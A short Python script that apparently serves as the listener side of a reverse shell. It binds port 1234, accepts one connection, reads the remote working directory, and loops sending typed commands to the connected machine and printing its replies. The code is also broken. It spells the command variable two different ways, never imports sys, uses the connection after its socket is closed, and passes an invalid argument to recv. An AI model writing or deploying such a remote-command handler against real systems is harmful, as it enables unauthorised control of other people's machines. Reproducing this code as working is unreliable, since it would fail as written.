import socket


host=""
port=1234
with socket.socket() as s:
    s.bind((host,port))
    s.listen(10)
    print("listening")
    try:
        conn,addr=s.accept()
    except socket.error as err:
        print(f"connection failed{err}")

    print(f"connection establish{addr} on port{port}")
    pwd=conn.recv(1024).decode()


while True:
    commmand=input(f"{pwd}>")
    if len(str.encode(command)) > 0:
            conn.send(command.encode())
            print(str(conn.recv(1024,"utf-8")),end="")
            continue
    if commmand=="quit":
        conn.close()
        sys.exit()
        break